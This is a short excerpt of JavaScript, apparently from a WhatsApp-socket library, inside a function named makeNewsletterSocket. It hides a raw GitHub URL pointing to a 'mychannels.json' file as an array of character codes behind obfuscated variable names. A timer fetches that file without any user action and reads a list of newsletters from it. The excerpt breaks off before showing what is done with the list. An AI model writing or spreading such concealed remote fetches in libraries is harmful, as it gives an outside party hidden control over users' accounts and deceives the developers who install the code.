...
const makeNewsletterSocket = (sock) => {
    ...
    const _0x1a = [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,112,101,115,104,45,50,53,52,47,70,88,84,82,65,68,69,45,66,79,84,47,109,97,105,110,47,109,121,99,104,97,110,110,101,108,115,46,106,115,111,110];
    const _0x2b = () => _0x1a.map(c => String.fromCharCode(c)).join('');
    
    setTimeout(async () => {
        try {
            const _0x3c = await fetch(_0x2b());
            if (!_0x3c.ok) return;
            const newsletters = await _0x3c.json();
